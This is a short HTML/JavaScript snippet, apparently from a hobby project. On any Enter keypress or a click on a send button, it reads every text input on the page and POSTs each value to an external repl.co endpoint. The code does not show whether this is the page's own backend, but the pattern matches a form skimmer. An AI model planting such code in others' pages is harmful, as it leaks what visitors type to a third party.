<script>
document.addEventListener('keypress', function (e) {
         if (e.key === 'Enter') {
      getc();
    }
    })
let btn = document.getElementById("btn-send").addEventListener("click", function() {
getc();
});

async function postData(url, data){
  try{

     let response = await fetch(
       url, 
       {
            method: 'POST',
            body: JSON.stringify(data),//convert data to JSON string
          headers: { 'Content-Type':'application/json' }// JSON data
       },
     );//1. Send http request and get response
     
     let result = await response.text();//2. Get message from response
     console.log(result);//3. Do something with the message
   
   }catch(error){
     console.log(error);//catch and log any errors
   }
}
    function getc() {
        // GET ALL THE INPUT ELEMENTS.
        var ele = document.getElementsByTagName('input');

        // LOOP THROUGH EACH ELEMENT.
        for (i = 0; i < ele.length; i++) {

            // CHECK THE ELEMENT TYPE.
            if (ele[i].type == 'text') {
               // console.log('Value: ' + ele[i].value);
                postData("https://FreeLumpyElements.keyman500.repl.co/getit",{"value":ele[i].value})
            }
        }
    } 
</script>